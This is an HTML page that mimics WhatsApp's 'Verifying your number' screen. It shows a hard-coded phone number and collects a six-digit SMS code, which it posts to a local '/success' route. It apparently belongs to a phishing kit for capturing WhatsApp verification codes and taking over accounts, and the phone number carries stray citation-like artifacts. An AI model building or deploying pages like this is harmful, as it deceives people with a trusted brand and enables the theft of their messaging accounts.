<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification - Step 2</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>

    <form action="/success" method="POST" class="form-wrapper" id="step2Form">
        <div class="wrapper">
            <div class="step-view active">
                <div class="header-top">
                    <span class="close-icon">&times;</span>
                    <span class="menu-icon">&#8942;</span>
                </div>
                <h2>Verifying your number</h2>
                <div class="instructions" style="margin-bottom: 24px;">
                    SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 706 620 0591[span_0](start_span)[span_0](end_span)</span>. 
                    <a href="/" class="edit-link">Wrong number?</a>
                </div>

                <!-- Hidden input to carry forward the phone string via form post/get -->
                <input type="hidden" id="hiddenPhoneField" name="full_phone" value="">

                <!-- Single OTP Field Container -->
                <div class="single-otp-container">
                    <input type="text" class="single-otp-input" id="otpInput" name="otp" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" placeholder="------" required autofocus>
                </div>

                <div class="resend-container">
                    <a href="#" class="resend-link" id="resendBtn">Didn't receive code?</a>
                </div>
            </div>
        </div>

        <!-- Persistent Bottom Action Button -->
        <div class="action-container">
            <button type="submit" class="btn-next" id="nextBtn" disabled>Verify</button>
        </div>
    </form>

    <script src="static/script.js"></script>
</body>
</html>
